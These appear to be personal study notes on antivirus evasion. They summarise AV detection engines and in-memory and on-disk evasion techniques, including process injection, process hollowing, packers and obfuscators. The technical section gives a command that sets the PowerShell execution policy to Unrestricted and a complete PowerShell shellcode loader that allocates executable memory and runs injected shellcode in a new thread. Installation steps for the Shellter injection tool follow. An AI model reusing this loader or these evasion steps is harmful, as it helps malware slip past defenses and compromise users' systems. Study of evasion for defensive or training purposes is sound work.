#############
## THEORY STUFF
#############

Modern antivirus components:
File Engine
Memory Engine
Network Engine
Disassembler
Emulator/Sandbox
Browser Plugin
Machine Learning Engine

Modern AV methodologies:
-Signature-Based Detection: Is when the filesystem is scanned for known malware signatures.
-Heuristic-Based Detection: Trying to break down the machine code and, in the end, decompile it for a thorough analysis of the source code to gain a more complete understanding of the program.
-Behavior-Based Detection:This is commonly done by running the respective file within an emulated environment, like a small virtual machine, and identifying behaviors or actions that are deemed malicious.
-Machine-Learning Detection: Microsoft Windows Defender consists of two machine learning components: the client ML engine, responsible for generating ML models and heuristics, and the cloud ML engine, capable of analyzing the provided sample against a metadata-based model encompassing all submitted samples. In cases where the client ML engine cannot ascertain whether a program is benign, it will seek a final response from the cloud ML counterpart.

INMEMORY EVASION
-Remote Process Memory Injection: inject the payload into another valid PE that is not malicious. Initially, we employ the OpenProcess function to acquire a valid HANDLE to a target process for which we have appropriate access permissions. Subsequently, with the obtained HANDLE, we allocate memory within the context of that process through a Windows API like VirtualAllocEx. Once the memory has been allocated in the remote process, we transfer the malicious payload to the newly allocated memory using WriteProcessMemory. Following the successful copying of the payload, it is typically executed in memory as a separate thread using the CreateRemoteThread API.
-Reflective DLL Injection: Load a DLL that the attacker has stored in the process memory. The main problem with using this technique is that LoadLibrary can't load a DLL from memory, and there are no built-in Windows tools to handle this either. Attackers who use this method need to create their own version of the API, one that doesn't rely on a DLL stored on the disk.
-Process Hollowing: initiate the launch of a harmless process in a paused state. After starting, the process's image is erased from memory and substituted with a harmful executable image. Subsequently, the process is resumed, leading to the execution of malicious code instead of the original, legitimate process.
-Inline hooking: redirects trhough a hook for a function containing the malcode, which then returns to the original as it was never been used.

ONDISK EVASION
https://upx.github.io/
# Packer avoid detection with less code possible

Obfuscation:
https://en.wikipedia.org/wiki/Dead_code
# Dead code is used to def evasion through waste of memory and cpu usage

https://www.enigmaprotector.com/en/home.html
# Recomended by use of cryptography, in the website it says that uses a Virtual CPU making it more difficult to disassemble.

########
## TECH STUFF
########

Get-ExecutionPolicy -Scope CurrentUser
# Check for the current exec policy of user on ps

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
# The sintax is very obvious

Thread Injection >>> X32 <<<
================================
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
================================

###### SHELLTER ######
Install
$ sudo apt install shellter
$ sudo apt install wine
$ sudo dpkg --add-architecture i386
$ sudo apt-get update
$ apt-get install wine32























